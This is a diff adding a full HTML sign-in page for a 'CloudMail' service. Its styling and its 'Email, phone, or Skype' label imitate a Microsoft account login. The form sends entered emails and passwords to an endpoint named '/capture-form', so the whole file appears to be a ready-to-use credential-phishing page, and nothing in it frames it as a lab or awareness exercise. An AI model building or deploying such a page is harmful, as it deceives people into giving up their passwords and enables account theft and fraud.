@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign In – CloudMail</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      min-height: 100vh;
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #f3f2f1;
+      display: flex;
+      flex-direction: column;
+    }
+    .topbar {
+      padding: 16px 24px;
+      background: #fff;
+      border-bottom: 1px solid #e0e0e0;
+    }
+    .topbar .brand { font-size: 20px; font-weight: 700; color: #0078d4; }
+    .main {
+      flex: 1; display: flex;
+      align-items: center; justify-content: center;
+      padding: 40px 16px;
+    }
+    .card {
+      background: #fff;
+      border: 1px solid #e0e0e0;
+      border-radius: 4px;
+      padding: 44px 44px 36px;
+      width: 100%; max-width: 440px;
+      box-shadow: 0 2px 6px rgba(0,0,0,.08);
+    }
+    h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 4px; }
+    .sub { font-size: 13px; color: #616161; margin-bottom: 28px; }
+
+    .field { margin-bottom: 20px; }
+    label { display: block; font-size: 13px; font-weight: 600; color: #323130; margin-bottom: 4px; }
+    input[type="email"],
+    input[type="password"],
+    input[type="text"] {
+      width: 100%; padding: 8px 10px;
+      border: 1px solid #8a8886;
+      border-radius: 2px;
+      font-size: 14px; color: #323130;
+      outline: none; transition: border-color .1s;
+    }
+    input:focus { border-color: #0078d4; border-width: 2px; }
+
+    .options {
+      font-size: 13px; color: #0078d4;
+      margin-bottom: 28px; cursor: pointer;
+    }
+    .options:hover { text-decoration: underline; }
+
+    .btn-next {
+      padding: 8px 20px;
+      background: #0078d4; color: #fff;
+      border: none; border-radius: 2px;
+      font-size: 15px; font-weight: 600;
+      cursor: pointer; float: right;
+      transition: background .1s;
+    }
+    .btn-next:hover { background: #106ebe; }
+
+    .clearfix::after { content: ''; display: table; clear: both; }
+
+    .divider { border: none; border-top: 1px solid #edebe9; margin: 32px 0 20px; }
+
+    .create { font-size: 13px; color: #0078d4; cursor: pointer; }
+    .create:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+  <div class="topbar">
+    <span class="brand">CloudMail</span>
+  </div>
+  <div class="main">
+    <div class="card">
+      <h1>Sign in</h1>
+      <p class="sub">to continue to CloudMail</p>
+
+      <form action="/capture-form" method="POST">
+        <div class="field">
+          <label for="email">Email, phone, or Skype</label>
+          <input type="email" id="email" name="email" autocomplete="off">
+        </div>
+
+        <div class="field">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" autocomplete="off">
+        </div>
+
+        <p class="options">Forgot password?</p>
+
+        <div class="clearfix">
+          <button type="submit" class="btn-next">Sign in</button>
+        </div>
+      </form>
+
+      <hr class="divider">
+      <span class="create">Create account</span>
+    </div>
+  </div>
+</body>
+</html>
